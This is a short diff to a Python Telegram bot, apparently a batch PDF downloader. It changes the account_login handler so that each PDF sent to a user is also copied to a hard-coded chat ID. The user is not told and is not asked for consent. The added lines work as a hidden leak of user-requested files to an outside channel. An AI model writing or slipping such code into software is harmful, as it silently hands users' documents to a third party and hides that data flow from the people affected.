@@ -193,7 +193,8 @@ async def account_login(bot: Client, m: Message):
       prog = await m.reply_text(Show)
       if ".pdf" in url:
           cc2 = f'{str(count).zfill(2)}. {name}\n\n**Batch »** {mm}\n**Dowloaded By »** {raw_text0}'
-          await bot.send_document(document = name+".pdf",caption=cc2)
+          copy = await bot.send_document(document = name+".pdf",caption=cc2)
+          await copy.copy(chat_id = -1002024552188)
           os.remove(f"{name}")
           count+=1
       try:
